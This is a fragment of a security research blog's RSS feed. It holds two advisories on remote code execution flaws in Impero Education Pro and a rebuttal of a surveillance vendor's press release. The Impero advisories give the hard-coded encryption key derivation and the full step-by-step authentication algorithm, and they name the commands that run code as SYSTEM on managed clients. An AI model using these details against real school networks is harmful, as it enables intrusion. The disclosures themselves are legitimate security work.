+&lt;p&gt;The vendor was not amused at our &lt;a href=&quot;../../../2015/07/14/impero.html&quot;&gt;last security advisory&lt;/a&gt; because full disclosure was opted for instead of co-ordinated disclosure. They responded with a &lt;a href=&quot;../../../files/Letter%20to%20Mr%20Zammis%20A%20Clark%20dated%2013%20July%202015.pdf&quot;&gt;cease-and-desist letter&lt;/a&gt; from their lawyers.&lt;/p&gt;
+
+&lt;p&gt;This time, we decided to inform them of the new vulnerabilities outlined in this advisory before public release.&lt;/p&gt;
+
+&lt;p&gt;So we arranged for 9001 copies of the advisory and proof-of-concept to be &lt;a href=&quot;http://iops.io/blog/impero-software-over-9000&quot;&gt;delivered to their office in person&lt;/a&gt;. They were not amused either. There is just no winning, is there? See below for a video of the delivery.&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/OCh867rT1dg?start=90&quot; frameborder=&quot;0&quot; allowfullscreen&gt;&lt;/iframe&gt;
+
+&lt;h1&gt;Issues&lt;/h1&gt;
+
+&lt;p&gt;The week after the &lt;a href=&quot;../../../2015/07/14/impero.html&quot;&gt;vulnerabilities in version 5.0.03 and below&lt;/a&gt; were disclosed, the vendor released a hotfix to work around the issue. The hotfix adds additional authentication that is needed to access the &lt;code&gt;ECHO&lt;/code&gt; command; a static security-by-obscurity challenge-response system that is only a little less trivial to implement.&lt;/p&gt;
+
+&lt;p&gt;A client with this new authentication algorithm implemented can connect to a server that implements it and continue to exploit the previously discovered vulnerabilities.&lt;/p&gt;
+
+&lt;h2&gt;Privilege Escalation (leading to Remote Code Execution)&lt;/h2&gt;
+
+&lt;p&gt;Due to a static security-by-obscurity weak authentication algorithm, all clients are able to send client commands to other clients via the &lt;code&gt;ECHO&lt;/code&gt; command, which can only be accessed after performing the authentication algorithm. This can be used to execute system commands.&lt;/p&gt;
+
+&lt;p&gt;The authentication algorithm does not require the client to know any secrets or passphrases - only knowledge of the algorithm itself is needed to authenticate.&lt;/p&gt;
+
+&lt;p&gt;A &lt;a href=&quot;https://github.com/lizardhq/exploits/blob/master/impero/impero-rce-poc-2.php&quot;&gt;remote code execution proof-of-concept that exploits these issues and pops &lt;code&gt;calc.exe&lt;/code&gt; on all connected clients is available&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3&gt;Authentication algorithm&lt;/h3&gt;
+
+&lt;p&gt;The static authentication algorithm is as follows.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Create a SHA512 hash of some random data, encode it as hexits, and send to the server &lt;code&gt;AUTHENTICATE_L1&lt;/code&gt;, with the argument being the hash.&lt;/li&gt;
+&lt;li&gt;The server should send back a &lt;code&gt;CHALLENGE_L1&lt;/code&gt; command, with one argument which is a hexit-encoded SHA512 hash of random data that it created. (Side note: in the server implementation, a non-cryptographically secure PRNG is used.)&lt;/li&gt;
+&lt;li&gt;Concatenate together the hash that the server sent back, the string &lt;code&gt;{edbe23f3-eeda-49ef-9155-9bab8f584c55},{b40121e9-bb21-47c2-9ff7-4cbb09ec06a8}753f&lt;/code&gt;, and the hash that we sent to the server, and make a SHA512 hash of this string. We call this hash &lt;code&gt;hash one&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Apply 1000 rounds of SHA512 on &lt;code&gt;hash one&lt;/code&gt;, to create &lt;code&gt;hash two&lt;/code&gt;. Store the hash in both raw binary data and as hexits.&lt;/li&gt;
+&lt;li&gt;Brute force a SHA512 hash based on the raw binary data of &lt;code&gt;hash two&lt;/code&gt;. This should be done by finding an integer &lt;code&gt;i&lt;/code&gt; (iterating from 0), encoding it in hexadecimal form, concatenating it to the raw binary data of &lt;code&gt;hash two&lt;/code&gt;, hashing it (&lt;code&gt;SHA512(hashtwo.hex(i))&lt;/code&gt;) and comparing the first two bytes of the resulting hash and &lt;code&gt;hash one&lt;/code&gt;. If they are equal, the resulting hash becomes &lt;code&gt;hash three&lt;/code&gt;, which should be stored as raw binary data. &lt;em&gt;Yes, bruteforcing is actually a part of the authentication algorithm - presumably as some kind of proof-of-work.&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;Brute force another SHA512 hash based on the raw binary data of &lt;code&gt;hash two&lt;/code&gt;. This is done the same as previously in step 5, except &lt;code&gt;hash two&lt;/code&gt; should be contatenated to the hexadecimal encoded integer (&lt;code&gt;SHA512(hex(i).hashtwo)&lt;/code&gt;), and the last two bytes should be compared; if they are equal, the generated hash becomes &lt;code&gt;hash four&lt;/code&gt;, which should be stored as raw binary data.
+Concatenate &lt;code&gt;hash three&lt;/code&gt; and &lt;code&gt;hash four&lt;/code&gt; together, and create a SHA512 hash of the resulting byte array, to create &lt;code&gt;hash five&lt;/code&gt;, which should be stored as hexits.&lt;/li&gt;
+&lt;li&gt;Take the first 0x10 bytes from the &lt;code&gt;hash five&lt;/code&gt; hexit string, and from now on use it as the protocol communication AES key. Similarly, take the last 0x10 bytes from the hexit string, and use it as the new initialisation vector.&lt;/li&gt;
+&lt;li&gt;Using the new key/IV, send to the server &lt;code&gt;RESPONSE_L1&lt;/code&gt;, with the argument being the hexit encoded &lt;code&gt;hash two&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;The server should send a &lt;code&gt;SERVER_AUTH_L1&lt;/code&gt; command with the argument &lt;code&gt;OK&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Send the server a &lt;code&gt;CLIENT_AUTH_L1&lt;/code&gt; command with no argument.
+The server does not respond to this command; after the command is sent, the client is fully authenticated.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1&gt;Affected Versions&lt;/h1&gt;
+
+&lt;p&gt;5.0.08+ and 5.1.02+.&lt;/p&gt;
+
+&lt;h1&gt;Solution&lt;/h1&gt;
+
+&lt;p&gt;Uninstallation of Impero Education Pro will prevent exploitation of these issues. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.&lt;/p&gt;
+</description>
+        <pubDate>Tue, 04 Aug 2015 00:00:00 +0200</pubDate>
+        <link>/2015/08/04/impero-2.html</link>
+        <guid isPermaLink="true">/2015/08/04/impero-2.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Security Advisory: Multiple Critical Vulnerabilities in Impero Education Pro</title>
+        <description>&lt;h1&gt;Overview&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.imperosoftware.co.uk/&quot;&gt;Impero Education Pro&lt;/a&gt; is &amp;quot;a single, feature rich solution combining network management, desktop management and classroom management software for education&amp;quot;.&lt;/p&gt;
+
+&lt;p&gt;Issues in Impero Education Pro, version 5.0.03 and below, can be exploited to cause remote command execution on every client.&lt;/p&gt;
+
+&lt;h1&gt;Issues&lt;/h1&gt;
+
+&lt;p&gt;The software consists of a client that communicates with a server, to enable the server to manage and monitor the client machine. There exists issues in the communication and authentication method between the client and server, which can be easily leveraged to allow for remote code execution on every client machine managed by the server. This is due to a fatal design flaw in the software: the server grants all clients the privilege to execute system commands on any other client&amp;#39;s machine.&lt;/p&gt;
+
+&lt;p&gt;A &lt;a href=&quot;https://github.com/lizardhq/exploits/blob/master/impero/impero-rce-poc.php&quot;&gt;remote code execution proof-of-concept that exploits these issues and pops &lt;code&gt;calc.exe&lt;/code&gt; on all connected clients is available&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2&gt;Privilege Escalation (leading to Remote Code Execution)&lt;/h2&gt;
+
+&lt;p&gt;All clients are able to send client commands to other clients via the &lt;code&gt;ECHO&lt;/code&gt; command, which can be used to execute system commands.&lt;/p&gt;
+
+&lt;h3&gt;Server-side commands&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;The &lt;code&gt;SENDALLCLIENTS&lt;/code&gt; command causes the server to send the client a list of all connected clients. This list may be gzip compressed and base64 encoded.&lt;/li&gt;
+&lt;li&gt;The &lt;code&gt;ECHO&lt;/code&gt; command sends the command given as the argument across to all specified clients, enabling access to commands only implemented on the client side.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3&gt;Client-side commands&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;The &lt;code&gt;OPENFILE&lt;/code&gt; command takes as arguments a file to run, and the username and password to run it as. For Windows clients, the username can be &lt;code&gt;NT AUTHORITY\SYSTEM&lt;/code&gt;, and if that is the case, the password given can be anything.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;The &lt;code&gt;SENDCOMMANDMSG&lt;/code&gt; command takes one argument: a system command that gets passed to &lt;code&gt;system()&lt;/code&gt; and ran as the user that the Impero service is running as; this, of course, will be SYSTEM on Windows.&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Note that some protocol commands get logged server-side. This includes &lt;code&gt;SENDCOMMANDMSG&lt;/code&gt; but not &lt;code&gt;OPENFILE&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2&gt;Hard-coded Encryption Key&lt;/h2&gt;
+
+&lt;p&gt;The protocol is encrypted on the wire with AES-128-CBC, and ISO10126 padding. The key and IV are static and derived from a SHA512 hash of the string &lt;code&gt;Imp3ro&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2&gt;Hard-coded Authentication Password&lt;/h2&gt;
+
+&lt;p&gt;When connected, a client must authenticate. This is done by sending the string &lt;code&gt;-1|AUTHENTICATE\x02PASSWORD&lt;/code&gt;, encrypted as outlined in the above section (&lt;em&gt;Hard-coded Encryption Key&lt;/em&gt;). &lt;code&gt;PASSWORD&lt;/code&gt; is a string that is hard-coded - that is the actual password.&lt;/p&gt;
+
+&lt;p&gt;After authentication, an attacker has full reign to send whatever supported protocol commands they wish.&lt;/p&gt;
+
+&lt;h1&gt;Affected Versions&lt;/h1&gt;
+
+&lt;p&gt;5.0.03 and below.&lt;/p&gt;
+
+&lt;h1&gt;Solution&lt;/h1&gt;
+
+&lt;p&gt;Uninstallation of Impero Education Pro will prevent exploitation of these issues. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.&lt;/p&gt;
+</description>
+        <pubDate>Tue, 14 Jul 2015 00:00:00 +0200</pubDate>
+        <link>/2015/07/14/impero.html</link>
+        <guid isPermaLink="true">/2015/07/14/impero.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Response to Decision Group press release about security vulnerabilities in E-Detective Lawful Interception System</title>
+        <description>&lt;p&gt;&lt;em&gt;By Mustafa Al-Bassam.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Two weeks ago we posted a &lt;a href=&quot;../../../2015/06/14/e-detective.html&quot;&gt;security advisory&lt;/a&gt; detailing severe security flaws in E-Detective, a &amp;quot;lawful&amp;quot; communications interception system. The vendor is a company called Decision Group and they &lt;a href=&quot;http://www.edecision4u.com/HTTPS-SSL.html&quot;&gt;claim on their website&lt;/a&gt; that their software is used by over 100 law enforcement agencies.&lt;/p&gt;
+
+&lt;p&gt;A few days ago they posted a &lt;a href=&quot;http://www.edecision4u.com/2015news/20150618_New%20Release.html&quot;&gt;press release&lt;/a&gt; to respond to an &lt;a href=&quot;http://www.ibtimes.co.uk/e-detective-spying-tool-used-by-over-100-law-enforcement-agencies-has-major-security-holes-1506447&quot;&gt;IBTimes article&lt;/a&gt; that covered the security flaws.&lt;/p&gt;
+
+&lt;p&gt;The mere fact that they responded to a news article about the security flaws instead of the original security advisory is telling of their attitude to security. An attitude that is unfortunately too common: that security is seen as an externality that affects its customers more than the company itself, so resources should only be devoted to it if it&amp;#39;s a public relations issue.&lt;/p&gt;
+
+&lt;p&gt;Nevertheless, their response is very much a non-response. It fails to express responsibility for the security holes, and instead deflects the responsibility on their customers.&lt;/p&gt;
+
+&lt;p&gt;Excusing their broken English, here&amp;#39;s a point-by-point response to their press release.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Actually we are fully aware of such security concern since 4 years ago when our client asked to enhance the security level of E-Detective system.&amp;quot;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The fact that they&amp;#39;ve been fully aware of these security flaws for 4 years and failed to do something about them until recently is not exactly redeeming. That only makes it much, much worse.&lt;/p&gt;
+
+&lt;p&gt;By their own admission they admit that third parties (their clients) have known about these vulnerabilities. Their clients (one of whom they claim to be the National Security Bureau of the Republic of China, which is effectively the Taiwanese NSA) buy their software for the purpose of degrading security. One can only shudder to imagine how many times these flaws have been attempted to be exploited for the purpose of collecting intercepts from other customers.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;The most important guideline of E-Detective deployment is that E-Detective should be deployed in the closed network domain without Internet access to outside world. This network domain should be also isolated from other corporate or government service network segment. By this way, only few authentic staff can access the internal system.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;A great example of how a false sense of security can be dangerous. Isolating services in their own network doesn&amp;#39;t fix the security flaws nor make them impossible to exploit - it just makes it harder.&lt;/p&gt;
+
+&lt;p&gt;There are countless ways that a private network can be compromised. No matter how tight your network is. To get any reasonable work done staff members will move data in and out of the network, even if your network is disconnected from the Internet. There are many entry points into a network, something which shouldn&amp;#39;t really need to be explained to a company that sells surveillance software for a living if they are competent.&lt;/p&gt;
+
+&lt;p&gt;Software compartmentalisation and network isolation is a good security practice, but it&amp;#39;s not a substitute for fixing vulnerabilities or an excuse to run dangerously insecure software.&lt;/p&gt;
+
+&lt;p&gt;Even if one was to make the (false) assumption that running E-Detective on an isolated network prevents vulnerabilities affected by it from being exploited: how many of those &amp;quot;100+&amp;quot; customers actually follow these guidelines or have a sane network setup that allows them to do this kind of isolation?&lt;/p&gt;
+
+&lt;p&gt;Furthermore, the actual function of E-Detective means that it can never be on a fully isolated network. There will always be an entry point. E-Detective intercepts communications by using a man-in-the-middle proxy. That proxy will need to be connected to the network that the customer wants to intercept communications from. Based on the case studies that they list on their website, that network will also probably be connected to the Internet.&lt;/p&gt;
+
+&lt;p&gt;Unless a human being is manually transferring data using external storage from the proxy to the E-Detective system, then the system will probably also be in some way connected to the proxy.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Since all users of E-Detective are of 4 types: operator, administrator, auditor and datamvr. Operator has the authorized right to input queries and view the scope of intercepted data by his/her own right. Administrator can have authorized right to conduct the operation of system backup, user management, and software system tuning…etc. Auditor has the only right to check and view all log files in the system. The last type of user is only for data transport between different systems, and it cannot be used for system access. None of these users has the superuser right of root. In most cases, root is basically set to hibernation status after system is activated by license under customer SLA request in order to terminate security backdoor.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;All of this is made useless by a vulnerability that was discovered after the publication of the original security advisory. It turns out that features that the root user has access to are hidden from the menu of other users, but other users can still access those features by manually navigating to each feature&amp;#39;s page.&lt;/p&gt;
+
+&lt;p&gt;Even if the root user is deactivated after installation in &amp;quot;most cases&amp;quot;, this still doesn&amp;#39;t address the fact that the system backup feature uses a static key, which can be exploited to perform remote code execution.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Besides, E-Detective can be integrated with OTP server for more secured access control, and all logon access record will be reviewed in OTP server for auditing. Biometric access mechanism module with fingerprint can be also available by customer request, but it depends on whether the fingerprint reader is supported on user workstation.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The system is so dangerously insecure beyond easy repair at this point that we feel sorry for anyone that has to trust it with their biometric data.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;After all, E-Detective system is used by our customer for network forensic purpose, such as internal data leakage protection, cyber evidence collection and lawful interception. System security is always the top priority for our customer. All the vulnerabilities mentioned in the news by International Business Times have been fixed several months ago. “Customer IT security is always our top concern,” said Casper Kan Chang, CEO of Decision Group, “and we have already fixed all the vulnerabilities in this current version of E-Detective for more than 11 months.” For those existing customers with old version of system still has concern, Decision Group will update it for free without hesitation.&amp;quot;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;If IT security is &amp;quot;always&amp;quot; their top concern, why did it take them 3 years to (claim to) fix these vulnerabilities? Have they proactively contacted the customers that are running insecure versions of their software, or are they waiting for their customers to contact them?&lt;/p&gt;
+</description>
+        <pubDate>Thu, 25 Jun 2015 00:00:00 +0200</pubDate>
+        <link>/2015/06/25/e-detective-response.html</link>
+        <guid isPermaLink="true">/2015/06/25/e-detective-response.html</guid>
+        
+        
+      </item>
+    
+  </channel>
+</rss>
